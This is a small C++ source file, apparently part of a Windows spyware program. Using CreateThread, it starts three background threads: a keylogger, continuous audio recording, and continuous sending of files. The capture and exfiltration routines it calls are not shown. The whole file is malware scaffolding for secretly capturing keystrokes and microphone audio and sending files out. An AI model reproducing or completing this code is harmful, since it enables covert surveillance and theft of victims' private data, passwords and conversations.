#include "../headers/headers.hpp"

using namespace std;

DWORD WINAPI keyloggerThreadFunction(LPVOID windowsPointerParams) {
    log();
}

DWORD WINAPI threadEnregistrementAudio(LPVOID windowsPointerParams) {
    constantListen();
}

DWORD WINAPI fileSendingThread(LPVOID windowsPointerParams){
    continuousFileSend();
}

void beginKeyloggerThread(HANDLE &thread, LPDWORD threadId) {
    thread = CreateThread(NULL, 0, keyloggerThreadFunction, nullptr, 0, threadId);
}

void beginAudioRecording(HANDLE &thread, LPDWORD threadId) {
    thread = CreateThread(NULL, 0, threadEnregistrementAudio, NULL, 0, threadId);
}

void beginfileSendingThread(HANDLE &thread, LPDWORD threadId){
    thread = CreateThread(NULL, 0, fileSendingThread, NULL, 0, threadId);
}